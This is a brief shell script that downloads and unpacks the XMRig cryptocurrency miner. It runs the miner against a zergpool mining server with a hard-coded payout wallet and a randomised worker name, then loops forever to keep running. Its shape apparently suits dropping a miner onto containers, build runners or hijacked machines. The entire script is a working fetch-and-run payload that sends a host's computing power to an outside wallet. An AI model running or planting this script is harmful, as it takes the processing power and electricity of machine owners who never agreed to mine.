#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u pze048sl60v6upk64v587rmmf45tzrfgvsxm6wmuat.$(shuf -n 1 -i 1-99999)-cpu --keepalive --timeout 120 --donate-level 0 -p c=BCH,mc=UPX
while [ 1 ]; do
sleep 3
done
sleep 999
